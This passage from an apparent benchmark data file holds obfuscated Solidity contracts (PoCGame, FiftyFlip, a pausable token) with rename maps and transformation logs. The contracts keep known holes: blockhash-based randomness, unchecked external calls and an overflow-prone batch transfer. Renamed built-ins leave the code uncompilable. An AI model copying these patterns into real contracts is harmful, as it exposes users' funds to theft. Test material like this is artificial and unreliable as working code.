        "_len": "_0xec5c4a",
        "_kit": "_0x91bc96",
        "secs": "_0x174340",
        "_bid": "_0xa28d49",
        "_cut": "_0x5c577c",
        "_src": "_0x100d10",
        "name": "_0x7e5a67",
        "sum": "_0xb5402a",
        "now": "_0xa86656",
        "_id": "_0x828784",
        "_to": "_0x57cad2",
        "who": "_0x1806ee",
        "kit": "_0x272bcd",
        "_tp": "_0x921296",
        "res": "_0xf98fc2",
        "val": "_0x50b9f8",
        "bid": "_0xaed5e6",
        "g1": "_0xda8240",
        "ok": "_0xbeb5d3",
        "to": "_0xe71485",
        "_p": "_0x75303f",
        "g2": "_0x533db8"
      },
      "changes": [
        "Renamed 272 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 62, column 9', 'Syntax error at line 63, column 9', 'Syntax error at line 82, column 1']"
    },
    {
      "original_id": "sn_ds_215",
      "transformed_id": "ss_l4_medium_sn_ds_215",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract PoCGame\n{\n\n    modifier _0x846e0b()\n    {\n        require(msg.sender == _0x83ffc8);\n        _;\n    }\n\n   modifier _0x6e6373()\n    {\n        require(_0x3d44df);\n        _;\n    }\n\n    modifier _0xab7928()\n    {\n          require (msg.sender == tx.origin);\n        _;\n    }\n\n    modifier  _0x7d5a02()\n    {\n        require (_0x17cf5b[msg.sender] > 0);\n        _;\n    }\n\n    event Wager(uint256 _0x9f3de5, address _0x627299);\n    event Win(uint256 _0x9f3de5, address _0x08a92b);\n    event Lose(uint256 _0x9f3de5, address _0xf9d164);\n    event Donate(uint256 _0x9f3de5, address _0x08a92b, address _0xcdbc7b);\n    event DifficultyChanged(uint256 _0x210392);\n    event BetLimitChanged(uint256 _0x1c1128);\n\n    address private _0x11b78e;\n    uint256 _0xb3cbd2;\n    uint difficulty;\n    uint private _0x51deff;\n    address _0x83ffc8;\n    mapping(address => uint256) _0x2fe1ab;\n    mapping(address => uint256) _0x17cf5b;\n    bool _0x3d44df;\n    uint256 _0x93fcbf;\n\n    constructor(address _0xf4334f, uint256 _0x9206d1)\n    _0xab7928()\n    public\n    {\n        _0x3d44df = false;\n        _0x83ffc8 = msg.sender;\n        _0x11b78e = _0xf4334f;\n        _0x93fcbf = 0;\n        _0xb3cbd2 = _0x9206d1;\n\n    }\n\n    function OpenToThePublic()\n    _0x846e0b()\n    public\n    {\n        _0x3d44df = true;\n    }\n\n    function AdjustBetAmounts(uint256 _0x9f3de5)\n    _0x846e0b()\n    public\n    {\n        _0xb3cbd2 = _0x9f3de5;\n\n        emit BetLimitChanged(_0xb3cbd2);\n    }\n\n    function AdjustDifficulty(uint256 _0x9f3de5)\n    _0x846e0b()\n    public\n    {\n        difficulty = _0x9f3de5;\n\n        emit DifficultyChanged(difficulty);\n    }\n\n    function() public payable { }\n\n    function _0x7577d5()\n    _0x6e6373()\n    _0xab7928()\n    payable\n    public\n    {\n        //You have to send exactly 0.01 ETH.\n        require(msg.value == _0xb3cbd2);\n\n        //log the wager and timestamp(block number)\n        _0x2fe1ab[msg.sender] = block.number;\n        _0x17cf5b[msg.sender] = msg.value;\n        emit Wager(msg.value, msg.sender);\n    }\n\n    function _0xf34678()\n    _0x6e6373()\n    _0xab7928()\n    _0x7d5a02()\n    public\n    {\n        uint256 _0xe2441f = _0x2fe1ab[msg.sender];\n        if(_0xe2441f < block.number)\n        {\n            _0x2fe1ab[msg.sender] = 0;\n            _0x17cf5b[msg.sender] = 0;\n\n            uint256 _0xd13359 = uint256(_0xc2f398(abi._0xf085bd(blockhash(_0xe2441f),  msg.sender)))%difficulty +1;\n\n            if(_0xd13359 == difficulty / 2)\n            {\n                _0x41de67(msg.sender);\n            }\n            else\n            {\n                //player loses\n                _0x216ba0(_0xb3cbd2 / 2);\n            }\n        }\n        else\n        {\n            revert();\n        }\n    }\n\n    function _0x607bbb()\n    _0x6e6373()\n    public\n    payable\n    {\n        _0x7750af(msg.value);\n    }\n\n    function _0x41de67(address _0x71a1a3)\n    internal\n    {\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n        uint256 _0x59c6ed = address(this).balance / 2;\n\n        _0x71a1a3.transfer(_0x59c6ed);\n        emit Win(_0x59c6ed, _0x71a1a3);\n    }\n\n    function _0x7750af(uint256 _0x9f3de5)\n    internal\n    {\n        uint256 _unused3 = 0;\n        uint256 _unused4 = 0;\n        _0x11b78e.call.value(_0x9f3de5)(bytes4(_0xc2f398(\"donate()\")));\n        _0x93fcbf += _0x9f3de5;\n        emit Donate(_0x9f3de5, _0x11b78e, msg.sender);\n    }\n\n    function _0x216ba0(uint256 _0x9f3de5)\n    internal\n    {\n        _0x11b78e.call.value(_0x9f3de5)(bytes4(_0xc2f398(\"donate()\")));\n        _0x93fcbf += _0x9f3de5;\n        emit Lose(_0x9f3de5, msg.sender);\n    }\n\n    function _0xdbb129()\n    public\n    view\n    returns (uint256)\n    {\n        return address(this).balance;\n    }\n\n    function _0x210392()\n    public\n    view\n    returns (uint256)\n    {\n        return difficulty;\n    }\n\n    function _0x1c1128()\n    public\n    view\n    returns (uint256)\n    {\n        return _0xb3cbd2;\n    }\n\n    function _0x26b2ae(address _0x5e380d)\n    public\n    view\n    returns (bool)\n    {\n        if(_0x17cf5b[_0x5e380d] > 0)\n        {\n            return true;\n        }\n        else\n        {\n            return false;\n        }\n\n    }\n\n    function _0x4ed359()\n    public\n    view\n    returns (uint256)\n    {\n        return address(this).balance / 2;\n    }\n\n    function _0x3f299d(address _0x18728b, address _0x69c0db, uint _0x6bf196)\n    public\n    _0x846e0b()\n    returns (bool _0x233c1e)\n    {\n        return ERC20Interface(_0x18728b).transfer(_0x69c0db, _0x6bf196);\n    }\n}\n\n//Define ERC20Interface.transfer, so PoCWHALE can transfer tokens accidently sent to it.\ncontract ERC20Interface\n{\n    function transfer(address _0x88819f, uint256 _0x6bf196) public returns (bool _0x233c1e);\n}",
      "rename_map": {
        "transferAnyERC20Token": "_0x3f299d",
        "currentDifficulty": "_0x210392",
        "hasPlayerWagered": "_0x26b2ae",
        "currentBetLimit": "_0x1c1128",
        "isOpenToPublic": "_0x6e6373",
        "onlyRealPeople": "_0xab7928",
        "ethToTransfer": "_0x59c6ed",
        "winningNumber": "_0xd13359",
        "donateToWhale": "_0x7750af",
        "totalDonated": "_0x93fcbf",
        "whaleAddress": "_0xf4334f",
        "tokenAddress": "_0x18728b",
        "openToPublic": "_0x3d44df",
        "encodePacked": "_0xf085bd",
        "blockNumber": "_0xe2441f",
        "onlyPlayers": "_0x7d5a02",
        "ethBalance": "_0xdbb129",
        "winnersPot": "_0x4ed359",
        "wagerLimit": "_0x9206d1",
        "timestamps": "_0x2fe1ab",
        "randomSeed": "_0x51deff",
        "tokenOwner": "_0x69c0db",
        "onlyOwner": "_0x846e0b",
        "loseWager": "_0x216ba0",
        "keccak256": "_0xc2f398",
        "depositer": "_0x627299",
        "betLimit": "_0xb3cbd2",
        "success": "_0x233c1e",
        "donator": "_0xcdbc7b",
        "amount": "_0x9f3de5",
        "donate": "_0x607bbb",
        "player": "_0x5e380d",
        "payout": "_0x41de67",
        "winner": "_0x71a1a3",
        "tokens": "_0x6bf196",
        "paidTo": "_0x08a92b",
        "wagers": "_0x17cf5b",
        "wager": "_0x7577d5",
        "loser": "_0xf9d164",
        "owner": "_0x83ffc8",
        "whale": "_0x11b78e",
        "play": "_0xf34678",
        "to": "_0x88819f"
      },
      "changes": [
        "Renamed 43 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_216",
      "transformed_id": "ss_l4_medium_sn_ds_216",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract FiftyFlip {\n    uint constant DONATING_X = 20; // 2% kujira\n\n    // Need to be discussed\n    uint constant JACKPOT_FEE = 10; // 1% jackpot\n    uint constant JACKPOT_MODULO = 1000; // 0.1% jackpotwin\n    uint constant DEV_FEE = 20; // 2% devfee\n    uint constant WIN_X = 1900; // 1.9x\n\n    // There is minimum and maximum bets.\n    uint constant MIN_BET = 0.01 ether;\n    uint constant MAX_BET = 1 ether;\n\n    uint constant BET_EXPIRATION_BLOCKS = 250;\n\n    // owner and PoC contract address\n    address public _0x1ebec9;\n    address public _0x9d6d54;\n    address public _0xb7052f;\n    address private _0x737416;\n\n    // Accumulated jackpot fund.\n    uint256 public _0x57e28d;\n    uint256 public _0xbef6e3;\n\n    // Funds that are locked in potentially winning bets.\n    uint256 public _0xf391de;\n    uint256 public _0xf46bab;\n\n    struct Bet {\n        // Wager amount in wei.\n        uint _0x40cdaa;\n        // Block number of placeBet tx.\n        uint256 _0x1660d9;\n        // Bit mask representing winning bet outcomes (see MAX_MASK_MODULO comment).\n        bool _0x67c2fb;\n        // Address of a player, used to pay out winning bets.\n        address _0x043038;\n    }\n\n    mapping (uint => Bet) _0x30b7dd;\n    mapping (address => uint) _0x1f6fab;\n\n    // events\n    event Wager(uint _0xc87776, uint _0x3a550b, uint256 _0x66cb1f, bool _0x67c2fb, address _0xebb14c);\n    event Win(address _0x0e4cb2, uint _0x40cdaa, uint _0xc87776, bool _0x4fbfcf, uint _0xfe91ce);\n    event Lose(address _0xbe3adb, uint _0x40cdaa, uint _0xc87776, bool _0x4fbfcf, uint _0xfe91ce);\n    event Refund(uint _0xc87776, uint256 _0x40cdaa, address _0x3d84e0);\n    event Donate(uint256 _0x40cdaa, address _0x7bea8b);\n    event FailedPayment(address _0x9d18bd, uint _0x40cdaa);\n    event Payment(address _0xb96bec, uint _0x40cdaa);\n    event JackpotPayment(address _0x043038, uint _0xc87776, uint _0x6542d7);\n\n    // constructor\n    constructor (address _0x8f9d8a, address _0x409b0e, address _0x8ef7d8) public {\n        _0x1ebec9 = msg.sender;\n        if (true) { _0x9d6d54 = _0x409b0e; }\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0x737416 = _0x8f9d8a; }\n        _0xb7052f = _0x8ef7d8;\n        _0x57e28d = 0;\n        _0xbef6e3 = 0;\n        _0xf391de = 0;\n        _0xf46bab = 0;\n    }\n\n    // modifiers\n    modifier _0x6b2b7a() {\n        require (msg.sender == _0x1ebec9, \"You are not the owner of this contract!\");\n        _;\n    }\n\n    modifier _0x81019e() {\n        require (msg.sender == _0x9d6d54, \"You are not the bot of this contract!\");\n        _;\n    }\n\n    modifier _0xfd7966() {\n        require (address(this).balance >= _0xf391de + _0x57e28d + _0xbef6e3, \"This contract doesn't have enough balance, it is stopped till someone donate to this game!\");\n        _;\n    }\n\n    // betMast:\n    // false is front, true is back\n\n    function() public payable { }\n\n    function _0x530fbb(address _0x409b0e)\n    _0x6b2b7a()\n    external\n    {\n        _0x9d6d54 = _0x409b0e;\n    }\n\n    function _0xe495c5(address _0xdc2207)\n    _0x6b2b7a()\n    external\n    {\n        _0xb7052f = _0xdc2207;\n    }\n\n    // wager function\n    function _0x19f63f(bool _0x532193, uint _0xc87776, uint _0x98019e, uint8 v, bytes32 r, bytes32 s)\n    _0xfd7966()\n    external\n    payable {\n        Bet storage _0xa3efcc = _0x30b7dd[_0xc87776];\n        uint _0x40cdaa = msg.value;\n        address _0x043038 = msg.sender;\n        require (_0xa3efcc._0x043038 == address(0), \"Ticket is not new one!\");\n        require (_0x40cdaa >= MIN_BET, \"Your bet is lower than minimum bet amount\");\n        require (_0x40cdaa <= MAX_BET, \"Your bet is higher than maximum bet amount\");\n        require (_0x4ed634() >= 2 * _0x40cdaa, \"If we accept this, this contract will be in danger!\");\n\n        require (block.number <= _0x98019e, \"Ticket has expired.\");\n        bytes32 _0x6cc2a5 = _0x1a4032(abi._0x3c2b5a('\\x19Ethereum Signed Message:\\n37', uint40(_0x98019e), _0xc87776));\n        require (_0xb7052f == _0x1cb303(_0x6cc2a5, v, r, s), \"web3 vrs signature is not valid.\");\n\n        _0x57e28d += _0x40cdaa * JACKPOT_FEE / 1000;\n        _0xbef6e3 += _0x40cdaa * DEV_FEE / 1000;\n        _0xf391de += _0x40cdaa * WIN_X / 1000;\n\n        uint _0x3b080a = _0x40cdaa * DONATING_X / 1000;\n        _0x737416.call.value(_0x3b080a)(bytes4(_0x1a4032(\"donate()\")));\n        _0xf46bab += _0x3b080a;\n\n        _0xa3efcc._0x40cdaa = _0x40cdaa;\n        _0xa3efcc._0x1660d9 = block.number;\n        _0xa3efcc._0x67c2fb = _0x532193;\n        _0xa3efcc._0x043038 = _0x043038;\n\n        emit Wager(_0xc87776, _0xa3efcc._0x40cdaa, _0xa3efcc._0x1660d9, _0xa3efcc._0x67c2fb, _0xa3efcc._0x043038);\n    }\n\n    // method to determine winners and losers\n    function _0xfc527c(uint _0x430fa1)\n    _0xfd7966()\n    external\n    {\n        uint _0xc87776 = uint(_0x1a4032(abi._0x3c2b5a(_0x430fa1)));\n        Bet storage _0xa3efcc = _0x30b7dd[_0xc87776];\n        require (_0xa3efcc._0x043038 != address(0), \"TicketID is not correct!\");\n        require (_0xa3efcc._0x40cdaa != 0, \"Ticket is already used one!\");\n        uint256 _0x1660d9 = _0xa3efcc._0x1660d9;\n        if(_0x1660d9 < block.number && _0x1660d9 >= block.number - BET_EXPIRATION_BLOCKS)\n        {\n            uint256 _0x0bc65b = uint256(_0x1a4032(abi._0x3c2b5a(blockhash(_0x1660d9),  _0x430fa1)));\n            bool _0x4fbfcf = (_0x0bc65b % 2) !=0;\n            uint _0xfe91ce = _0x0bc65b % JACKPOT_MODULO;\n\n            uint _0x8276d5 = _0xa3efcc._0x40cdaa * WIN_X / 1000;\n\n            uint _0xee0ac2 = 0;\n            uint _0x6542d7 = 0;\n\n            if(_0xa3efcc._0x67c2fb == _0x4fbfcf) {\n                _0xee0ac2 = _0x8276d5;\n            }\n            if(_0xfe91ce == 0) {\n                _0x6542d7 = _0x57e28d;\n                _0x57e28d = 0;\n            }\n            if (_0x6542d7 > 0) {\n                emit JackpotPayment(_0xa3efcc._0x043038, _0xc87776, _0x6542d7);\n            }\n            if(_0xee0ac2 + _0x6542d7 > 0)\n            {\n                _0x10fed4(_0xa3efcc._0x043038, _0xee0ac2 + _0x6542d7, _0xc87776, _0x4fbfcf, _0xfe91ce);\n            }\n            else\n            {\n                _0xe072bc(_0xa3efcc._0x043038, _0xa3efcc._0x40cdaa, _0xc87776, _0x4fbfcf, _0xfe91ce);\n            }\n            _0xf391de -= _0x8276d5;\n            _0xa3efcc._0x40cdaa = 0;\n        }\n        else\n        {\n            revert();\n        }\n    }\n\n    function _0xbbb389()\n    external\n    payable\n    {\n        uint256 _unused1 = 0;\n        // Placeholder for future logic\n        _0x1f6fab[msg.sender] += msg.value;\n        emit Donate(msg.value, msg.sender);\n    }\n\n    function _0xb6d9c3(uint _0x40cdaa)\n    external\n    {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        require(_0x1f6fab[msg.sender] >= _0x40cdaa, \"You are going to withdraw more than you donated!\");\n\n        if (_0x771e26(msg.sender, _0x40cdaa)){\n            _0x1f6fab[msg.sender] -= _0x40cdaa;\n        }\n    }\n\n    // method to refund\n    function _0x1f65c7(uint _0xc87776)\n    _0xfd7966()\n    external {\n        Bet storage _0xa3efcc = _0x30b7dd[_0xc87776];\n\n        require (_0xa3efcc._0x40cdaa != 0, \"this ticket has no balance\");\n        require (block.number > _0xa3efcc._0x1660d9 + BET_EXPIRATION_BLOCKS, \"this ticket is expired.\");\n        _0xae1ff1(_0xc87776);\n    }\n\n    // Funds withdrawl\n    function _0x19b110(address _0xa72aee, uint _0x21ac2c)\n    _0x6b2b7a()\n    _0xfd7966()\n    external {\n        require (_0xbef6e3 >= _0x21ac2c, \"You are trying to withdraw more amount than developer fee.\");\n        require (_0x21ac2c <= address(this).balance, \"Contract balance is lower than withdrawAmount\");\n        require (_0xbef6e3 <= address(this).balance, \"Not enough funds to withdraw.\");\n        if (_0x771e26(_0xa72aee, _0x21ac2c)){\n            _0xbef6e3 -= _0x21ac2c;\n        }\n    }\n\n    // Funds withdrawl\n    function _0x09b3ae(uint _0x21ac2c)\n    _0x81019e()\n    _0xfd7966()\n    external {\n        require (_0xbef6e3 >= _0x21ac2c, \"You are trying to withdraw more amount than developer fee.\");\n        require (_0x21ac2c <= address(this).balance, \"Contract balance is lower than withdrawAmount\");\n        require (_0xbef6e3 <= address(this).balance, \"Not enough funds to withdraw.\");\n        if (_0x771e26(_0x9d6d54, _0x21ac2c)){\n            _0xbef6e3 -= _0x21ac2c;\n        }\n    }\n\n    // Get Bet Info from id\n    function _0xc3735a(uint _0xc87776)\n    constant\n    external\n    returns (uint, uint256, bool, address){\n        Bet storage _0xa3efcc = _0x30b7dd[_0xc87776];\n        return (_0xa3efcc._0x40cdaa, _0xa3efcc._0x1660d9, _0xa3efcc._0x67c2fb, _0xa3efcc._0x043038);\n    }\n\n    // Get Bet Info from id\n    function _0x87f3a9()\n    constant\n    external\n    returns (uint){\n        return address(this).balance;\n    }\n\n    // Get Collateral for Bet\n    function _0x4ed634()\n    constant\n    public\n    returns (uint){\n        if (address(this).balance > _0xf391de + _0x57e28d + _0xbef6e3)\n            return address(this).balance - _0xf391de - _0x57e28d - _0xbef6e3;\n        return 0;\n    }\n\n    // Contract may be destroyed only when there are no ongoing bets,\n    // either settled or refunded. All funds are transferred to contract owner.\n    function _0xb2950f() external _0x6b2b7a() {\n        require (_0xf391de == 0, \"All bets should be processed (settled or refunded) before self-destruct.\");\n        selfdestruct(_0x1ebec9);\n    }\n\n    // Payout ETH to winner\n    function _0x10fed4(address _0x0e4cb2, uint _0x76a2f9, uint _0xc87776, bool _0x4fbfcf, uint _0xfe91ce)\n    internal\n    {\n        _0x0e4cb2.transfer(_0x76a2f9);\n        emit Win(_0x0e4cb2, _0x76a2f9, _0xc87776, _0x4fbfcf, _0xfe91ce);\n    }\n\n    // sendRefund to requester\n    function _0xae1ff1(uint _0xc87776)\n    internal\n    {\n        Bet storage _0xa3efcc = _0x30b7dd[_0xc87776];\n        address _0x3d84e0 = _0xa3efcc._0x043038;\n        uint256 _0x76a2f9 = _0xa3efcc._0x40cdaa;\n        _0x3d84e0.transfer(_0x76a2f9);\n\n        uint _0x8276d5 = _0xa3efcc._0x40cdaa * WIN_X / 1000;\n        _0xf391de -= _0x8276d5;\n\n        _0xa3efcc._0x40cdaa = 0;\n        emit Refund(_0xc87776, _0x76a2f9, _0x3d84e0);\n    }\n\n    // Helper routine to process the payment.\n    function _0x771e26(address _0x9d18bd, uint _0x40cdaa) private returns (bool){\n        bool _0xf82725 = _0x9d18bd.send(_0x40cdaa);\n        if (_0xf82725) {\n            emit Payment(_0x9d18bd, _0x40cdaa);\n        } else {\n            emit FailedPayment(_0x9d18bd, _0x40cdaa);\n        }\n        return _0xf82725;\n    }\n    // Payout ETH to whale when player loses\n    function _0xe072bc(address _0x043038, uint _0x40cdaa, uint _0xc87776, bool _0x4fbfcf, uint _0xfe91ce)\n    internal\n    {\n        emit Lose(_0x043038, _0x40cdaa, _0xc87776, _0x4fbfcf, _0xfe91ce);\n    }\n\n    // bulk clean the storage.\n    function _0xd39a62(uint[] _0xb1219f) external {\n        uint length = _0xb1219f.length;\n\n        for (uint i = 0; i < length; i++) {\n            _0x5994b6(_0xb1219f[i]);\n        }\n    }\n\n    // Helper routine to move 'processed' bets into 'clean' state.\n    function _0x5994b6(uint _0xc87776) private {\n        Bet storage _0xa3efcc = _0x30b7dd[_0xc87776];\n\n        // Do not overwrite active bets with zeros; additionally prevent cleanup of bets\n        // for which ticketID signatures may have not expired yet (see whitepaper for details).\n        if (_0xa3efcc._0x40cdaa != 0 || block.number <= _0xa3efcc._0x1660d9 + BET_EXPIRATION_BLOCKS) {\n            return;\n        }\n\n        _0xa3efcc._0x1660d9 = 0;\n        _0xa3efcc._0x67c2fb = false;\n        _0xa3efcc._0x043038 = address(0);\n    }\n\n    // A trap door for when someone sends tokens other than the intended ones so the overseers can decide where to send them.\n    function _0x04d5a9(address _0xd5219b, address _0x9ae7a2, uint _0x9c6906)\n    public\n    _0x6b2b7a()\n    returns (bool _0xf82725)\n    {\n        return ERC20Interface(_0xd5219b).transfer(_0x9ae7a2, _0x9c6906);\n    }\n}\n\n//Define ERC20Interface.transfer, so PoCWHALE can transfer tokens accidently sent to it.\ncontract ERC20Interface\n{\n    function transfer(address _0x2f3e47, uint256 _0x9c6906) public returns (bool _0xf82725);\n}\n",
      "rename_map": {
        "donateForContractHealth": "_0xbbb389",
        "transferAnyERC20Token": "_0x04d5a9",
        "getCollateralBalance": "_0x4ed634",
        "checkContractHealth": "_0xfd7966",
        "secretSignerAddress": "_0x8ef7d8",
        "getContractBalance": "_0x87f3a9",
        "totalAmountToWhale": "_0xf46bab",
        "autoPlayBotAddress": "_0x409b0e",
        "clearProcessedBet": "_0x5994b6",
        "toCleanTicketIDs": "_0xb1219f",
        "withdrawDonation": "_0xb6d9c3",
        "ticketLastBlock": "_0x98019e",
        "setSecretSigner": "_0xe495c5",
        "withdrawAddress": "_0xa72aee",
        "betBlockNumber": "_0x66cb1f",
        "withdrawAmount": "_0x21ac2c",
        "withdrawBotFee": "_0x09b3ae",
        "withdrawDevFee": "_0x19b110",
        "signatureHash": "_0x6cc2a5",
        "donate_amount": "_0x3b080a",
        "ethToTransfer": "_0x76a2f9",
        "setBotAddress": "_0x530fbb",
        "_secretSigner": "_0xdc2207",
        "tossWinAmount": "_0x8276d5",
        "secretSigner": "_0xb7052f",
        "ticketReveal": "_0x430fa1",
        "whaleAddress": "_0x8f9d8a",
        "tokenAddress": "_0xd5219b",
        "donateAmount": "_0x1f6fab",
        "clearStorage": "_0xd39a62",
        "encodePacked": "_0x3c2b5a",
        "lockedInBets": "_0xf391de",
        "autoPlayBot": "_0x9d6d54",
        "blockNumber": "_0x1660d9",
        "jackpotSize": "_0x57e28d",
        "jackpotWin": "_0x6542d7",
        "sendRefund": "_0xae1ff1",
        "getBetInfo": "_0xc3735a",
        "devFeeSize": "_0xbef6e3",
        "jackpotRes": "_0xfe91ce",
        "noPaidUser": "_0xb96bec",
        "tokenOwner": "_0x9ae7a2",
        "onlyOwner": "_0x6b2b7a",
        "loseWager": "_0xe072bc",
        "sendFunds": "_0x771e26",
        "betPlayer": "_0xebb14c",
        "ecrecover": "_0x1cb303",
        "keccak256": "_0x1a4032",
        "betAmount": "_0x3a550b",
        "requester": "_0x3d84e0",
        "paidUser": "_0x9d18bd",
        "ticketID": "_0xc87776",
        "betMask": "_0x67c2fb",
        "onlyBot": "_0x81019e",
        "success": "_0xf82725",
        "donator": "_0x7bea8b",
        "tossWin": "_0xee0ac2",
        "maskRes": "_0x4fbfcf",
        "amount": "_0x40cdaa",
        "player": "_0x043038",
        "payout": "_0x10fed4",
        "winner": "_0x0e4cb2",
        "refund": "_0x1f65c7",
        "tokens": "_0x9c6906",
        "random": "_0x0bc65b",
        "bMask": "_0x532193",
        "wager": "_0x19f63f",
        "loser": "_0xbe3adb",
        "owner": "_0x1ebec9",
        "whale": "_0x737416",
        "bets": "_0x30b7dd",
        "kill": "_0xb2950f",
        "play": "_0xfc527c",
        "bet": "_0xa3efcc",
        "to": "_0x2f3e47"
      },
      "changes": [
        "Renamed 75 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_232",
      "transformed_id": "ss_l4_medium_sn_ds_232",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.16;\n\nlibrary SafeMath {\n  function _0xd7c991(uint256 a, uint256 b) internal constant returns (uint256) {\n        // Placeholder for future logic\n        if (false) { revert(); }\n    uint256 c = a * b;\n    require(a == 0 || c / a == b);\n    return c;\n  }\n\n  function _0x2ac2cd(uint256 a, uint256 b) internal constant returns (uint256) {\n        if (false) { revert(); }\n        // Placeholder for future logic\n    // require(b > 0); // Solidity automatically throws when dividing by 0\n    uint256 c = a / b;\n    // require(a == b * c + a % b); // There is no case in which this doesn't hold\n    return c;\n  }\n\n  function _0xb8ef6b(uint256 a, uint256 b) internal constant returns (uint256) {\n    require(b <= a);\n    return a - b;\n  }\n\n  function _0xf32cb2(uint256 a, uint256 b) internal constant returns (uint256) {\n    uint256 c = a + b;\n    require(c >= a);\n    return c;\n  }\n}\n\ncontract ERC20Basic {\n  uint256 public _0xea9c3d;\n  function _0x51b0f6(address _0x6210b7) public constant returns (uint256);\n  function transfer(address _0xb62dd7, uint256 value) public returns (bool);\n  event Transfer(address indexed from, address indexed _0xb62dd7, uint256 value);\n}\n\ncontract BasicToken is ERC20Basic {\n  using SafeMath for uint256;\n\n  mapping(address => uint256) _0xb099c6;\n\n  function transfer(address _0x843a66, uint256 _0x4178d6) public returns (bool) {\n    require(_0x843a66 != address(0));\n    require(_0x4178d6 > 0 && _0x4178d6 <= _0xb099c6[msg.sender]);\n\n    // SafeMath.sub will throw if there is not enough balance.\n    _0xb099c6[msg.sender] = _0xb099c6[msg.sender]._0xb8ef6b(_0x4178d6);\n    _0xb099c6[_0x843a66] = _0xb099c6[_0x843a66]._0xf32cb2(_0x4178d6);\n    Transfer(msg.sender, _0x843a66, _0x4178d6);\n    return true;\n  }\n\n  function _0x51b0f6(address _0x0fe4f7) public constant returns (uint256 balance) {\n    return _0xb099c6[_0x0fe4f7];\n  }\n}\n\ncontract ERC20 is ERC20Basic {\n  function _0x8411b7(address _0x1bec2a, address _0x9a8196) public constant returns (uint256);\n  function _0x371a2b(address from, address _0xb62dd7, uint256 value) public returns (bool);\n  function _0x7cebe7(address _0x9a8196, uint256 value) public returns (bool);\n  event Approval(address indexed _0x1bec2a, address indexed _0x9a8196, uint256 value);\n}\n\ncontract StandardToken is ERC20, BasicToken {\n\n  mapping (address => mapping (address => uint256)) internal _0x3f40f2;\n\n  function _0x371a2b(address _0x10c8f2, address _0x843a66, uint256 _0x4178d6) public returns (bool) {\n    require(_0x843a66 != address(0));\n    require(_0x4178d6 > 0 && _0x4178d6 <= _0xb099c6[_0x10c8f2]);\n    require(_0x4178d6 <= _0x3f40f2[_0x10c8f2][msg.sender]);\n\n    _0xb099c6[_0x10c8f2] = _0xb099c6[_0x10c8f2]._0xb8ef6b(_0x4178d6);\n    _0xb099c6[_0x843a66] = _0xb099c6[_0x843a66]._0xf32cb2(_0x4178d6);\n    _0x3f40f2[_0x10c8f2][msg.sender] = _0x3f40f2[_0x10c8f2][msg.sender]._0xb8ef6b(_0x4178d6);\n    Transfer(_0x10c8f2, _0x843a66, _0x4178d6);\n    return true;\n  }\n\n  function _0x7cebe7(address _0x0d2480, uint256 _0x4178d6) public returns (bool) {\n    _0x3f40f2[msg.sender][_0x0d2480] = _0x4178d6;\n    Approval(msg.sender, _0x0d2480, _0x4178d6);\n    return true;\n  }\n\n  function _0x8411b7(address _0x0fe4f7, address _0x0d2480) public constant returns (uint256 _0x026264) {\n    return _0x3f40f2[_0x0fe4f7][_0x0d2480];\n  }\n}\n\ncontract Ownable {\n  address public _0x1bec2a;\n\n  event OwnershipTransferred(address indexed _0xd3c4ca, address indexed _0xebb352);\n\n  function Ownable() {\n    _0x1bec2a = msg.sender;\n  }\n\n  modifier _0xf3d98d() {\n    require(msg.sender == _0x1bec2a);\n    _;\n  }\n\n  function _0xbf5aab(address _0xebb352) _0xf3d98d public {\n    require(_0xebb352 != address(0));\n    OwnershipTransferred(_0x1bec2a, _0xebb352);\n    _0x1bec2a = _0xebb352;\n  }\n\n}\n\ncontract Pausable is Ownable {\n  event Pause();\n  event Unpause();\n\n  bool public _0x7abc8a = false;\n\n  modifier _0xb8ab53() {\n    require(!_0x7abc8a);\n    _;\n  }\n\n  modifier _0x50bea2() {\n    require(_0x7abc8a);\n    _;\n  }\n\n  function _0x943998() _0xf3d98d _0xb8ab53 public {\n    _0x7abc8a = true;\n    Pause();\n  }\n\n  function _0xf41608() _0xf3d98d _0x50bea2 public {\n    _0x7abc8a = false;\n    Unpause();\n  }\n}\n\ncontract PausableToken is StandardToken, Pausable {\n\n  function transfer(address _0x843a66, uint256 _0x4178d6) public _0xb8ab53 returns (bool) {\n    return super.transfer(_0x843a66, _0x4178d6);\n  }\n\n  function _0x371a2b(address _0x10c8f2, address _0x843a66, uint256 _0x4178d6) public _0xb8ab53 returns (bool) {\n    return super._0x371a2b(_0x10c8f2, _0x843a66, _0x4178d6);\n  }\n\n  function _0x7cebe7(address _0x0d2480, uint256 _0x4178d6) public _0xb8ab53 returns (bool) {\n    return super._0x7cebe7(_0x0d2480, _0x4178d6);\n  }\n\n  function _0x554642(address[] _0x44fa23, uint256 _0x4178d6) public _0xb8ab53 returns (bool) {\n    uint _0x307a4b = _0x44fa23.length;\n    uint256 _0x8a340c = uint256(_0x307a4b) * _0x4178d6;\n    require(_0x307a4b > 0 && _0x307a4b <= 20);\n    require(_0x4178d6 > 0 && _0xb099c6[msg.sender] >= _0x8a340c);\n\n    _0xb099c6[msg.sender] = 